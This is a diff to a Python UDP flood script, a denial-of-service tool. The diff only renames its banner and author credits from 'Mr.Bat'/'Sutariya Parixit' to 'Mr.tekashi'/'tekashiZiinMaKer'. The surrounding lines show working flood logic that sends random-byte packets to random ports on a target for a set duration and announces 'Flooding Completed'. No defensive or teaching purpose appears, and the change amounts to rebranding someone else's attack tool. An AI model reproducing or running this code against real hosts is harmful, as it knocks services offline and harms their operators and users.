@@ -86,7 +86,7 @@ durclock = (lambda:0, time.clock)[duration > 0]
 duration = (1, (durclock() + duration))[duration > 0]
 packet = random._urandom(package)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-print("Mr.Bat Attack Started on \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration))
+print("Mr.tekashi Attack Started on \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration))
 while True:
         if (durclock() < duration):
                 port = random.randint(1, 65535)
@@ -95,7 +95,7 @@ while True:
                 break
 print("\n")
 print("\n\033[31m\033[1mFlooding Completed...:D\033[33m\n")
-print("Mr.Bat Attack has completed on \033[32m%s\033[33m for \033[32m%s\033[33m seconds by Sutariya Parixit." % (attack, duration))
+print("Mr.tekashi Attack has completed on \033[32m%s\033[33m for \033[32m%s\033[33m seconds by tekashiZiinMaKer." % (attack, duration))
 
 def connect(i):
     try:
